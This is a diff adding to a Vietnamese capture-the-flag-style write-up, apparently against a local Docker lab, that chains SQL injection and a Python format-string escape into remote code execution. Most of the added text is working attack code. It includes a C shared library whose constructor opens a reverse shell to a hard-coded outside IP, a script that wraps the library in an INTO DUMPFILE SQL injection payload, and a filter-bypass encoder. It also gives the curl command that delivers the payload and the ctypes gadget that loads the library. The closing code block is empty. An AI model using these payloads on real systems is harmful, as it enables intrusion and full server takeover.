@@ -285,3 +285,87 @@ Bạn có thể dùng công cụ tự động tạo payload ở: https://www.rev
 Payload mình dùng: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IPv4>",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
 
 Oke, thế là mình sẽ tạo ngay cho bản thân một file .so tự động thự thi mã trên khi được load như sau:
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+__attribute__((constructor))
+static void init(void) {
+    printf("*****HELLO WORLD!******\n");
+    system("echo ********SYSTEM EXECUTED!!******\n");
+    system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"104.64.219.249\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'");
+}
+```
+Sau đó compile mã C trên bằng GCC trên Linux:
+```bash
+gcc -shared -fPIC -o hello.so hello.c
+```
+
+Chúng ta được file hello.so.
+Sau đó mình dùng script nho nhỏ sau để tạo payload giúp ghi file hello.so lên server :
+(Ở đây mình đổi tên thành hello123.so do mình đã nạp hello.so lên server Docker từ trước, do mình test thì thấy nếu các lần sau nạp lên trùng tên thì sẽ bị cache)
+```python
+
+from pathlib import Path
+
+data = Path("hello123.so").read_bytes()
+hex_data = data.hex()
+
+payload = (
+    "x' AND 1=0 UNION SELECT "
+    f"0x{hex_data},'','' "
+    "INTO DUMPFILE '/var/run/mysqld/hello123.so'-- -"
+)
+
+Path("payload.txt").write_text(payload)
+
+print("SO bytes:", len(data))
+print("SQL payload characters:", len(payload))
+print("Saved to payload.txt")
+
+```
+
+Kết quả chúng ta thu được payload.txt là payload sẽ đẩy lên server. Nhưng cần một bước bypass nữa để có thể thành payload hoàn chỉnh, mình dùng script:
+```python
+FORBIDDEN = [
+    '"', '(', ')', ' ', ',', "'",
+    '\\', '/', '*', '+%', '-', ';', '#'
+]
+
+def bypass(payload, key="a"):
+    result = ""
+
+    for char in payload:
+        if char in FORBIDDEN:
+            index = FORBIDDEN.index(char)
+            result += f"{{{key}.FORBIDDEN_CHARACTERS[{index}]}}"
+        else:
+            result += char
+
+    return f"{{{key}}}" + result
+
+
+if __name__ == "__main__":
+    with open("payload.txt", "r", encoding="utf-8") as f:
+        payload = f.read()
+        payload = "".join(payload.splitlines())
+    payload = bypass(payload)
+    with open("output.txt", "w", encoding="utf-8") as f:
+        f.write(payload)
+        print("Saved to output.txt")
+    print("\n")
+
+```
+
+Công việc còn lại của chúng ta đơn giản là gửi payload lên:
+```bash
+curl 127.0.0.1:5002 -X POST --data-urlencode "username=admin" --data-urlencode "password@output.txt"
+```
+
+Nghe reverse shell 
+
+Load thư viện này vào bằng cách gửi `{a.__class__.__init__.__globals__[ctypes].cdll['/var/run/mysqld/hello123.so']}{a}`:
+
+```curl
+
+```
